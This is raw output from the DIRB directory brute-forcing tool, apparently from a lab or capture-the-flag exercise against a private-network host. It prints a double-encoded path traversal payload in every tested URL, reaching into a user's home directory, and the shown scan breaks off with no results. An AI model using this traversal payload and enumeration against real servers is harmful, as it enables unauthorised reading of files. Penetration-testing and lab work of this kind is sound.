
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
START_TIME: Sat Jul  5 01:20:13 2025
URL_BASE: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
*** Generating Wordlist...
                                                                               
GENERATED WORDS: 4612
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admincontrol
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admincp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminhelp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admin-interface
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administr8
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administracion
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administrador
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administrat
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administratie
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administration
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/Administration
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administrator
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administratoraccounts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administrators
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/administrivia
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminlogin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminlogon
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminpanel
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminpro
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admins
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/AdminService
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminsessions
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adminsql
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admintools
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/AdminTools
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admissions
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/admon
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ADMON
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adobe
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adodb
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ads
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adserver
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adsl
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adv
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adv_counter
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advanced
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advanced_search
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advancedsearch
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advert
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advertise
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advertisement
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advertisers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advertising
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adverts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advice
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/adview
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/advisories
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/af
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/aff
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiche
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiliate
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiliate_info
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiliate_terms
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiliates
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/affiliatewiz
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/africa
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/agb
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/agency
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/agenda
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/agent
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/agents
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/aggregator
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/AggreSpy
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ajax
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ajax_cron
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/akamai
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/akeeba.backend.log
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alarm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alarms
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/album
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/albums
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alcatel
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alert
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alerts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alias
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/aliases
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/all
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alltime
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/all-wcprops
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alpha
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alt
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni_add
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni_details
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni_info
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni_reunions
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/alumni_update
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/am
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/amanda
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/amazon
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/amember
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/analog
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/analyse
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/analysis
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/analytics
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/and
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/android
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/announce
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/announcement
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/announcements
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/annuaire
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/annual
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/anon
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/anon_ftp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/anonymous
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ansi
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/answer
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/answers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/antibot_image
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/antispam
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/antivirus
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/anuncios
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/any
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/aol
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ap
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apac
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apache
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apanel
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apc
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apexec
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/api
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apis
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apl
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app_browser
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app_browsers
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app_code
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app_data
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/app_themes
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/appeal
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/appeals
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/append
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/appl
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apple
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/applet
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/applets
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/appliance
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/appliation
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/application
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/application.wadl
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/applications
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apply
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/apps
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/AppsLocalLogin
                                                                                                                                                                                             
